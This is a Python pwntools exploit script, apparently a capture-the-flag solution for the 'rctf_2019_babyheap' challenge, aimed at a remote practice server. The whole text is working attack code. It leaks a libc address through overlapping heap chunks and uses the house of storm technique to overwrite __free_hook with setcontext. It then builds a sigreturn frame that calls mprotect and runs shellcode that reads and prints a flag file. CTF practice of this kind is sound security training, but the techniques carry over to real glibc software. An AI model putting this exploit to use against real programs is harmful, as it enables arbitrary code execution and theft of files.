from pwn import *

#p = process('./rctf_2019_babyheap')
p = remote('node4.buuoj.cn', 25079)
libc = ELF('libc-2.23.buu.so')

context.arch = 'amd64'
context.os = 'linux'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size):
    sla(b'Choice: ', b'1')
    sla(b'Size: ', str(size).encode())

def edit(idx, content):
    sla(b'Choice: ', b'2')
    sla(b'Index: ', str(idx).encode())
    sa(b'Content: ', content)

def delete(idx):
    sla(b'Choice: ', b'3')
    sla(b'Index: ', str(idx).encode())

def show(idx):
    sla(b'Choice: ', b'4')
    sla(b'Index: ', str(idx).encode())

alloc(0x88) #0
alloc(0x18) #1
alloc(0xf8) #2

alloc(0x18) #3

delete(0)
edit(1, b'a' * 0x10 + p64(0xb0))
delete(2)

alloc(0x88) #0, fd of chunk1 = main_arena + 0x58
show(1)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

delete(3)
delete(0)

#house of storm
alloc(0x18) #0
alloc(0x508) #2
alloc(0x18) #3
alloc(0x18) #4
alloc(0x508) #5
alloc(0x18) #6
alloc(0x18) #7

edit(2, b'a' * 0x4f0 + p64(0x500))
delete(2)
edit(0, b'a' * 0x18)
alloc(0x18) #2
alloc(0x4d8) #8
delete(2) #chunk's fd -> main_arena, bypass unlink check
delete(3) #unlink
alloc(0x30) #2
alloc(0x4e8) #3 overlap to 8

edit(5, b'a' * 0x4f0 + p64(0x500))
delete(5)
edit(4, b'a' * 0x18)
alloc(0x18) #5
alloc(0x4d8) #9
delete(5)
delete(6) #unlink
alloc(0x40) #5
delete(3)
alloc(0x4e8) #3
delete(3)

free_hook = libc_base + libc.sym['__free_hook']
storage = free_hook
fake_chunk = storage - 0x20

payload = b'\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(8, payload)
payload = b'\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk + 8) + p64(0) + p64(fake_chunk - 0x18 - 5)
edit(9, payload)

alloc(0x48) #3 free_hook - 0x10

setcontext = libc_base + libc.sym['setcontext']

shellcode_addr = free_hook & 0xFFFFFFFFF000

shellcode = '''
    xor rdi, rdi
    mov rsi, %d
    mov edx, 0x1000
    mov eax, 0
    syscall

    jmp rsi
''' % shellcode_addr
payload = b'a' * 0x10 + p64(setcontext + 53) + p64(free_hook + 0x18) * 2 + asm(shellcode)
edit(3, payload)

frame = SigreturnFrame()
frame.rsp = free_hook + 0x10 #ret to shellcode
frame.rdi = shellcode_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']
edit(9, bytes(frame))

#debug('b *free')

delete(9)

shellcode = shellcraft.open('flag')
shellcode += shellcraft.read(3, shellcode_addr + 0x100, 0x40)
shellcode += shellcraft.write(1, shellcode_addr + 0x100, 0x40)

sleep(0.1)

sl(asm(shellcode))

p.interactive()